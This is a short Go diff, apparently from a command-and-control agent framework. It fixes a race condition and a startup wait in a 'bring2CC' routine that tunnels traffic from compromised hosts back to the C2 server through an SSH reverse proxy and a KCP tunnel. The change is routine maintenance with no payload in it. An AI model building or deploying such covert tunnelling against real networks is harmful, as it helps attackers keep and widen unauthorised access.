@@ -109,11 +109,13 @@ func runBring2CC(cmd *cobra.Command, args []string) {
 		c2transport.C2RespPrintf(cmd, "Error: We don't have any internet to share\n")
 		return
 	}
+	modules.ReverseConnsMutex.Lock()
 	for p, cancelfunc := range modules.ReverseConns {
 		if addr == p {
 			cancelfunc()
 		}
 	}
+	modules.ReverseConnsMutex.Unlock()
 	targetAddrWithPort := fmt.Sprintf("%s:%s", addr, common.RuntimeConfig.Bring2CCReverseProxyPort)
 	ctx, cancel := context.WithCancel(context.Background())
 	kcpListenPort := fmt.Sprintf("%d", util.RandInt(10000, 60000))
@@ -121,7 +123,13 @@ func runBring2CC(cmd *cobra.Command, args []string) {
 		targetAddrWithPort = fmt.Sprintf("127.0.0.1:%s", kcpListenPort)
 		kcpServerAddr := fmt.Sprintf("%s:%s", addr, common.RuntimeConfig.KCPServerPort)
 		go transport.KCPTunClient(kcpServerAddr, kcpListenPort, common.RuntimeConfig.Password, def.MagicString, ctx, cancel)
-		util.TakeABlink()
+		// wait for KCP client to start
+		for i := 0; i < 20; i++ {
+			if netutil.IsPortOpen("127.0.0.1", kcpListenPort) {
+				break
+			}
+			time.Sleep(100 * time.Millisecond)
+		}
 	}
 	proxyPort, err := strconv.Atoi(common.RuntimeConfig.AgentSocksServerPort)
 	if err != nil {
@@ -129,7 +137,7 @@ func runBring2CC(cmd *cobra.Command, args []string) {
 		cancel()
 		return
 	}
-	err = transport.SSHReverseProxyClient(targetAddrWithPort, common.RuntimeConfig.Password, proxyPort, &modules.ReverseConns, def.ProxyServer, ctx, cancel)
+	err = transport.SSHReverseProxyClient(targetAddrWithPort, common.RuntimeConfig.Password, proxyPort, &modules.ReverseConns, modules.ReverseConnsMutex, def.ProxyServer, ctx, cancel)
 	if err != nil {
 		c2transport.C2RespPrintf(cmd, "%v\n", err)
 		return
